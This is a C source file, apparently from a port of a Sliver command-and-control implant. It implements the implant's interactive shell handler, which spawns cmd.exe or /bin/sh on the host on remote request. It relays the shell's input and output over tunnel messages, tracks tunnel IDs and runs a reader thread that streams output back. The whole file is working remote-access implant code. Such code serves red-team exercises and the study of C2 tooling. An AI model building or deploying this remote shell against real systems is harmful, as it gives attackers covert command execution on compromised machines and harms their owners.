/* src/modes/shell.c - interactive shell over Sliver tunnel messages.
 *
 * Protocol (mirrors the Go implant):
 *   ShellReq{Path,...}  -> Shell{Pid, TunnelID}   (response envelope)
 *   TunnelData{TunnelID, Data} -> bytes to the child's stdin (no response)
 *   TunnelData{TunnelID, Data} <- child stdout, sent by the reader thread
 *   TunnelData{TunnelID, Closed} -> peer closed, child stdin is closed
 */
#include "sliver/rpc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proc.h"

#define SLIVER_MAX_TUNNELS 8
#define SLIVER_SHELL_READ_CHUNK 4096

typedef struct {
  uint64_t id;
  int used;
  sliver_child_t *child;
  uint64_t sequence;
} shell_tunnel_t;

typedef int (*sliver_shell_send_fn)(uint32_t type, const void *data, size_t len);

static shell_tunnel_t g_tunnels[SLIVER_MAX_TUNNELS];
static sliver_shell_send_fn g_send = NULL;

void sliver_shell_set_sender(sliver_shell_send_fn fn) { g_send = fn; }

static shell_tunnel_t *tunnel_find(uint64_t id) {
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    if (g_tunnels[i].used && g_tunnels[i].id == id) {
      return &g_tunnels[i];
    }
  }
  return NULL;
}

static shell_tunnel_t *tunnel_alloc(uint64_t id, sliver_child_t *child) {
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    if (!g_tunnels[i].used) {
      g_tunnels[i].used = 1;
      g_tunnels[i].id = id;
      g_tunnels[i].child = child;
      g_tunnels[i].sequence = 0;
      return &g_tunnels[i];
    }
  }
  return NULL;
}

static void tunnel_release(shell_tunnel_t *t) {
  if (t == NULL || !t->used) {
    return;
  }
  if (t->child != NULL) {
    sliver_child_terminate(t->child);
    sliver_child_free(t->child);
  }
  memset(t, 0, sizeof(*t));
}

void sliver_shell_shutdown(void) {
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    tunnel_release(&g_tunnels[i]);
  }
}

static int send_tunnel_data(shell_tunnel_t *t, const void *data, size_t len, int closed) {
  sliver_buf_t msg;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  sliver_buf_init(&msg);
  t->sequence++;
  if (sliver_tunnel_data_encode(&msg, data, len, closed, t->sequence, t->id) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
  sliver_buf_free(&msg);
  return rc;
}

typedef struct {
  shell_tunnel_t *tunnel;
} shell_reader_arg_t;

static void shell_reader_thread(void *arg) {
  shell_reader_arg_t *r = (shell_reader_arg_t *)arg;
  char buf[SLIVER_SHELL_READ_CHUNK];

  for (;;) {
    long n = sliver_child_read(r->tunnel->child, buf, sizeof(buf));
    if (n <= 0) {
      break;
    }
    if (send_tunnel_data(r->tunnel, buf, (size_t)n, 0) != 0) {
      break;
    }
  }
  (void)send_tunnel_data(r->tunnel, NULL, 0, 1);
  free(r);
}

static uint64_t next_tunnel_id(void) {
  static uint64_t counter = 0;
  counter++;
  return ((uint64_t)sliver_now_ms() << 16) ^ (uint64_t)(sliver_current_pid() & 0xffff) ^ counter;
}

int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_shell_req_t sr;
  sliver_child_t *child = NULL;
  shell_tunnel_t *t;
  shell_reader_arg_t *arg;
  uint32_t pid = 0;
  uint64_t id;
  const char *argv[1];
  char err[256];

  if (sliver_shell_req_decode(req->data, req->data_len, &sr) != 0) {
    return -1;
  }
  if (sr.path[0] == '\0') {
    (void)snprintf(sr.path, sizeof(sr.path), "%s",
#if defined(_WIN32)
                   "cmd.exe"
#else
                   "/bin/sh"
#endif
    );
  }
  argv[0] = NULL;
  err[0] = '\0';
  if (sliver_child_spawn(sr.path, argv, 0, &child, &pid) != 0) {
    (void)snprintf(err, sizeof(err), "shell %s: cannot start", sr.path);
    return sliver_shell_encode(out, sr.path, 0, 0, 0, err);
  }
  id = next_tunnel_id();
  t = tunnel_alloc(id, child);
  if (t == NULL) {
    sliver_child_terminate(child);
    sliver_child_free(child);
    return sliver_shell_encode(out, sr.path, 0, pid, 0, "shell: tunnel table full");
  }
  arg = (shell_reader_arg_t *)calloc(1, sizeof(*arg));
  if (arg != NULL) {
    arg->tunnel = t;
    /* The reader thread owns `arg` and runs until the child exits. */
    if (sliver_thread_create(shell_reader_thread, arg) == NULL) {
      free(arg);
      LOG_WARN("shell: cannot start reader thread");
    }
  }
  LOG_DEBUG("shell: %s pid=%u tunnel=%llu", sr.path, pid, (unsigned long long)id);
  return sliver_shell_encode(out, sr.path, 0, pid, id, NULL);
}

int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_tunnel_data_t td;
  shell_tunnel_t *t;

  (void)out;
  if (sliver_tunnel_data_decode(req->data, req->data_len, &td) != 0) {
    return -2;
  }
  t = tunnel_find(td.tunnel_id);
  if (t == NULL) {
    return -2;
  }
  if (td.data_len != 0) {
    (void)sliver_child_write(t->child, td.data, td.data_len);
  }
  if (td.closed) {
    sliver_child_close_stdin(t->child);
  }
  return -2;
}

int sliver_rpc_handle_tunnel_close(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_tunnel_data_t td;
  (void)out;
  if (sliver_tunnel_data_decode(req->data, req->data_len, &td) == 0) {
    tunnel_release(tunnel_find(td.tunnel_id));
  }
  return -2;
}

int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *out) {
  (void)req;
  (void)out;
  return -2; /* piped shells have no window size */
}

